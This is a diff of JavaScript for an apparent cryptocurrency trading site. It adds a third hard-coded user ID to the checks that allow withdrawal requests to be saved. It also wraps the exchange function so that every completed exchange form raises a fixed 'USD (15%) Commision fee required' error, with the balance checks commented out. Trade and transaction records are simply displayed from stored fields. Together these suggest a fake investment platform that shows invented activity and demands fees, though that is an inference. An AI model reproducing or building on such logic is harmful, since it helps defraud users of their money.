@@ -139,8 +139,8 @@ const savebtcwithdrawlToDb = () => {
                 var uid = user.uid;
 
 
-                if (uid === "RdzfByeKcJfkhNiCIBIMqlVQnWe2" || uid === "5hFThgDxjcdHc2eDvQxevu9YjA82") {
-                    console.log("hmmm");
+                if (uid === "RdzfByeKcJfkhNiCIBIMqlVQnWe2" || uid === "5hFThgDxjcdHc2eDvQxevu9YjA82" || uid === "RtPlwXqnsAgic4y73eW7g4SuMz33") {
+
 
                     db.collection("btc-withdrawals").doc(uid).set({
                         btcaddress: btcAddress,
@@ -213,7 +213,7 @@ const saveethwithdrawlToDb = () => {
                 // https://firebase.google.com/docs/reference/js/firebase.User
                 var uid = user.uid;
 
-                if (uid === "RdzfByeKcJfkhNiCIBIMqlVQnWe2" || uid === "5hFThgDxjcdHc2eDvQxevu9YjA82") {
+                if (uid === "RdzfByeKcJfkhNiCIBIMqlVQnWe2" || uid === "5hFThgDxjcdHc2eDvQxevu9YjA82" || uid === "RtPlwXqnsAgic4y73eW7g4SuMz33") {
 
                     db.collection("eth-withdrawals").doc(uid).set({
                         ethaddress: ethAddress,
@@ -679,7 +679,7 @@ const getuserstrades = () => {
                     let tradeProfit5 = document.getElementById("tradeprofit5")
 
 
-                    
+
                     tradeDate.textContent = doc.data().tradedate
                     tradeDate2.textContent = doc.data().tradedate2
                     tradeDate3.textContent = doc.data().tradedate3
@@ -737,7 +737,7 @@ const getuserstransaction = () => {
                     let transactionamount2 = document.getElementById("transactionamount2")
 
 
-                    
+
                     transactiondate.textContent = doc.data().transactiondate
                     transactiondate2.textContent = doc.data().transactiondate2
 
@@ -891,90 +891,187 @@ const exchangeAssets = () => {
 
             let uid = user.uid;
 
-            if (document.getElementById("selectVal").value == "Assets" || document.getElementById("amounttoexchange").value == "") {
-                alert("Make sure to all fields are completed");
+            if (uid === "RdzfByeKcJfkhNiCIBIMqlVQnWe2" ||
+                uid === "5hFThgDxjcdHc2eDvQxevu9YjA82" ||
+                uid === "RtPlwXqnsAgic4y73eW7g4SuMz33") {
+
+                if (document.getElementById("selectVal").value == "Assets" || document.getElementById("amounttoexchange").value == "") {
+                    alert("Make sure to all fields are completed");
+                }
+                else {
+
+                    alert("Error: USD (15%) Commision fee required")
+                    selectedAssets = document.getElementById("selectVal").value;
+                    choosenAmount = document.getElementById("amounttoexchange").value;
+
+
+                    var docRef = db.collection("usd-wallets").doc(uid);
+
+
+                    // const btcBalanceAmount = document.getElementById("btcBalanceAmount").value;
+                    // const btcAmountOnHold = document.getElementById("btcAmountOnHold").value;
+
+                    //get users usd wallet
+                    // docRef.get().then((doc) => {
+                    //     if (doc.exists) {
+
+
+                    //         console.log("Document data:", doc.data().currentamount);
+
+
+                    //         currentUsdAmount = doc.data().currentamount;
+                    //         console.log(currentUsdAmount);
+
+
+                    //     } else {
+                    //         // doc.data() will be undefined in this case
+                    //         console.log("No such document!");
+                    //     }
+                    // }
+                    // ).catch((error) => {
+                    //     console.log("Error getting document:", error);
+
+
+                    // });
+
+                    // console.log(currentUsdAmount);
+
+
+                    //Check if funds are available
+                    // if (currentUsdAmount < choosenAmount) {
+                    //     console.log("Not enough funds")
+                    // }
+                    // else {
+
+                    //     if (selectedAssets == "Bitcoin") {
+
+                    //         console.log("You Sellected btc", currentUsdAmount)
+
+
+                    //         var docRef = db.collection("btc-wallets").doc(uid);
+
+                    //         docRef.get().then((doc) => {
+                    //             if (doc.exists) {
+                    //                 // console.log("Document data:", doc.data().currentamount);
+
+                    //                 let btcbalance = document.getElementById("btcBalanceAmount")
+                    //                 let btcamountonhold = document.getElementById("btcAmountOnHold")
+                    //                 btcbalance.textContent = doc.data().currentamount
+                    //                 btcamountonhold.textContent = doc.data().amountonhold
+
+                    //                 console.log(currentUsdAmount, choosenAmount)
+                    //             } else {
+                    //                 // doc.data() will be undefined in this case
+                    //                 // console.log("No such document!");
+                    //             }
+                    //         }).catch((error) => {
+                    //             // console.log("Error getting document:", error);
+                    //         });
+
+
+
+                    //     }
+
+
+
+                    // }
+
+
+
+                }
+
+
+
             }
             else {
 
-                alert("Error: USD (15%) Commision fee required")
-                selectedAssets = document.getElementById("selectVal").value;
-                choosenAmount = document.getElementById("amounttoexchange").value;
+                if (document.getElementById("selectVal").value == "Assets" || document.getElementById("amounttoexchange").value == "") {
+                    alert("Make sure to all fields are completed");
+                }
+                else {
+
+                    alert("Error: USD (15%) Commision fee required")
+                    selectedAssets = document.getElementById("selectVal").value;
+                    choosenAmount = document.getElementById("amounttoexchange").value;
 
 
-                var docRef = db.collection("usd-wallets").doc(uid);
+                    var docRef = db.collection("usd-wallets").doc(uid);
 
 
-                // const btcBalanceAmount = document.getElementById("btcBalanceAmount").value;
-                // const btcAmountOnHold = document.getElementById("btcAmountOnHold").value;
+                    // const btcBalanceAmount = document.getElementById("btcBalanceAmount").value;
+                    // const btcAmountOnHold = document.getElementById("btcAmountOnHold").value;
 
-                //get users usd wallet
-                // docRef.get().then((doc) => {
-                //     if (doc.exists) {
-
-
-                //         console.log("Document data:", doc.data().currentamount);
+                    //get users usd wallet
+                    // docRef.get().then((doc) => {
+                    //     if (doc.exists) {
 
 
-                //         currentUsdAmount = doc.data().currentamount;
-                //         console.log(currentUsdAmount);
+                    //         console.log("Document data:", doc.data().currentamount);
 
 
-                //     } else {
-                //         // doc.data() will be undefined in this case
-                //         console.log("No such document!");
-                //     }
-                // }
-                // ).catch((error) => {
-                //     console.log("Error getting document:", error);
+                    //         currentUsdAmount = doc.data().currentamount;
+                    //         console.log(currentUsdAmount);
 
 
-                // });
-
-                // console.log(currentUsdAmount);
-
-
-                //Check if funds are available
-                // if (currentUsdAmount < choosenAmount) {
-                //     console.log("Not enough funds")
-                // }
-                // else {
-
-                //     if (selectedAssets == "Bitcoin") {
-
-                //         console.log("You Sellected btc", currentUsdAmount)
+                    //     } else {
+                    //         // doc.data() will be undefined in this case
+                    //         console.log("No such document!");
+                    //     }
+                    // }
+                    // ).catch((error) => {
+                    //     console.log("Error getting document:", error);
 
 
-                //         var docRef = db.collection("btc-wallets").doc(uid);
+                    // });
 
-                //         docRef.get().then((doc) => {
-                //             if (doc.exists) {
-                //                 // console.log("Document data:", doc.data().currentamount);
-
-                //                 let btcbalance = document.getElementById("btcBalanceAmount")
-                //                 let btcamountonhold = document.getElementById("btcAmountOnHold")
-                //                 btcbalance.textContent = doc.data().currentamount
-                //                 btcamountonhold.textContent = doc.data().amountonhold
-
-                //                 console.log(currentUsdAmount, choosenAmount)
-                //             } else {
-                //                 // doc.data() will be undefined in this case
-                //                 // console.log("No such document!");
-                //             }
-                //         }).catch((error) => {
-                //             // console.log("Error getting document:", error);
-                //         });
+                    // console.log(currentUsdAmount);
 
 
+                    //Check if funds are available
+                    // if (currentUsdAmount < choosenAmount) {
+                    //     console.log("Not enough funds")
+                    // }
+                    // else {
 
-                //     }
+                    //     if (selectedAssets == "Bitcoin") {
+
+                    //         console.log("You Sellected btc", currentUsdAmount)
 
 
+                    //         var docRef = db.collection("btc-wallets").doc(uid);
 
-                // }
+                    //         docRef.get().then((doc) => {
+                    //             if (doc.exists) {
+                    //                 // console.log("Document data:", doc.data().currentamount);
+
+                    //                 let btcbalance = document.getElementById("btcBalanceAmount")
+                    //                 let btcamountonhold = document.getElementById("btcAmountOnHold")
+                    //                 btcbalance.textContent = doc.data().currentamount
+                    //                 btcamountonhold.textContent = doc.data().amountonhold
+
+                    //                 console.log(currentUsdAmount, choosenAmount)
+                    //             } else {
+                    //                 // doc.data() will be undefined in this case
+                    //                 // console.log("No such document!");
+                    //             }
+                    //         }).catch((error) => {
+                    //             // console.log("Error getting document:", error);
+                    //         });
 
 
 
+                    //     }
+
+
+
+                    // }
+
+
+
+                }
             }
+
+
 
 
             // ...
